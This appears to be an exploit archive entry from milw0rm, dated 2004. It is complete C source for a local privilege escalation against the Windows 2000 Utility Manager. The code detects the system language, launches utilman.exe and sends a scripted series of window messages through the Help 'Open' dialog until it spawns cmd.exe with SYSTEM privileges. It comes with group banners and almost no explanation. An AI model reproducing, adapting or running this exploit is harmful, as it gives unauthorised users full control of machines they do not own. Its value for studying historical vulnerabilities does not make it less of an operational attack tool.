/******************************************************************************************
 ****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4*****
 **                                [Crpt] Utility Manager exploit v1.666 modified by kralor [Crpt]                                **
 ******************************************************************************************
 **                          It gets system language and sets windows names to work on any win2k :P                     **
 **                                                     Feel free to add other languages :)                                                **
 **                                                           You know where we are..                                                          **
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 ******************************************************************************************/
/* original disclaimer */
//by Cesar Cerrudo  sqlsec>at<yahoo.com
//Local elevation of priviliges exploit for Windows 2K Utility Manager (second one!!!!)
//Gives you a shell with system privileges
//If you have problems try changing Sleep() values.
/* end of original disclaimer */

#include <stdio.h>
#include <windows.h>

struct {
 int id;
 char *utilman;
 char *winhelp;
 char *open;
} lang[] = {
	{ 0x0c,"Gestionnaire d'utilitaires","aide de Windows","Ouvrir" }, /* French  */
	{ 0x09,"Utility manager","Windows Help","Open" }		  /* English */
};

void print_lang(int id)
{
	char *lang_list[] = {"Neutral","Arabic","Bulgarian","Catalan","Chinese","Czech",
			     "Danish","German","Greek","English","Spanish","Finnish",
			     "French","Hebrew","Hungarian","Icelandic","italian",
			     "Japanese","Korean","Dutch","Norwegian","Polish",
			     "Portuguese","Romanian","Russian","Croatian","Serbian",
			     "Slovak","Albanian","Swedish","Thai","Turkish","Urdu",
			     "Indonesian","Ukrainian","Belarusian","Slovenian",
			     "Estonian","Latvian","Lithuanian","Farsi","Vietnamese",
			     "Armenian","Azeri","Basque","FYRO Macedonian","Afrikaans",
			     "Georgian","Faeroese","Hindi","Malay","Kazak","Kyrgyz",
			     "Swahili","Uzbek","Tatar","Not supported","Punjabi",
			     "Gujarati","Not supported","Tamil","Telugu","Kannada",
			     "Not supported","Not supported","Marathi","Sanskrit",
			     "Mongolian","Galician the best ;)","Konkani","Not supported",
			     "Not supported","Syriac","Not supported","Not supported",
			     "Divehi","Invariant"};
	printf("%s\r\n",lang_list[id]);
	return;
}

int set_lang(void)
{
	unsigned int lang_usr,lang_sys,id;

	id=GetSystemDefaultLangID();
	lang_sys=PRIMARYLANGID(id);
	id=GetUserDefaultLangID();
	lang_usr=PRIMARYLANGID(id);
	if(lang_usr!=lang_sys) {
		printf("warning: user language differs from system language\r\n\r\n");
		printf("1. system : ");print_lang(lang_sys);
		printf("2. user   : ");print_lang(lang_usr);printf("Select(1-2): ");
		id=getch();
	if(id!=49&&id!=50) {
		printf("wrong choice '%c', leaving.\r\n",id);
		exit(0);
		}
	if(id==49) {
		printf("system language\r\n");
		return lang_sys;
		}
	else
		printf("user language\r\n");
	}
	return lang_usr;
}

void banner()
{
	system("cls");
	printf("\r\n\r\n\t[Crpt] Utility Manager exploit v1.666 modified by kralor [Crpt]\r\n");
	printf("\t\t\t  base code by Cesar Cerrudo\r\n");
	printf("\t\t\t   You know where we are...\r\n\r\n");
	return;
}

int main(int argc, char* argv[])
{
        HWND lHandle, lHandle2;
        POINT point;
        char cmd[]="%windir%\\system32\\cmd.ex?";
	unsigned int i;
	int lang_id;

	banner();

	printf("[+] Gathering system language information\r\n");
	lang_id=set_lang();
	printf("[+] OK language ...");print_lang(lang_id);

	for(i=0;i<sizeof(lang)/sizeof(lang[0]);i++)
		if(lang[i].id==lang_id)
			break;
	if(i==sizeof(lang)/sizeof(lang[0])) {
		printf("error: undefined language.\r\n");
		return -1;
	}
	printf("[+] Trying to execute program with SYSTEM priviliges through utilman.exe\r\n");
	printf("prog: %s\r\n",cmd);
//  run utility manager
//       system("utilman.exe /start");
	WinExec("utilman.exe /start",SW_HIDE);
       Sleep(1000);

	lHandle=FindWindow(NULL, lang[i].utilman);   
        if (!lHandle) {
		printf("error: unable to start utilman.exe.\r\n");
                return 0;
        }

        PostMessage(lHandle,0x313,0,0); //=right click on the app button in the
	//taskbar or Alt+Space Bar
        
        Sleep(100);

        SendMessage(lHandle,0x365,0,0x1); //send WM_COMMANDHELP  0x0365  lParam must be<>NULL 
        Sleep(300);
        
	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_IME_KEYDOWN, VK_RETURN, 0);
        Sleep(500);

        // find open file dialog window
	lHandle = FindWindow("#32770",lang[i].open);
        // get input box handle
        lHandle2 = GetDlgItem(lHandle, 0x47C);
        Sleep(500);

        // set text to filter listview to display only cmd.exe
        SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)cmd);
        Sleep(800);

        // send return
        SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);

        //get navigation bar handle
        lHandle2 = GetDlgItem(lHandle, 0x4A0);
        
        //send tab
        SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
        Sleep(500);
        lHandle2 = FindWindowEx(lHandle,NULL,"SHELLDLL_DefView", NULL);
        //get list view handle
        lHandle2 = GetDlgItem(lHandle2, 0x1);

        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0); // send "c" char
        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0); // send "m" char
        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0); // send "d" char
        Sleep(500);

        //popup context menu
        PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
        Sleep(1000);

        // get context menu handle
        point.x =10; point.y =30;
        lHandle2=WindowFromPoint(point);

        SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
        SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
        SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0); // send return

        SendMessage (lHandle, WM_CLOSE,0,0); // close open file dialog window
        Sleep(500);

	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_CLOSE, 0, 0);// close open error window
	SendMessage (FindWindow(NULL, lang[i].utilman), WM_CLOSE, 0, 0);// close utilitymanager
        return 0;
}


// milw0rm.com [2004-07-17]
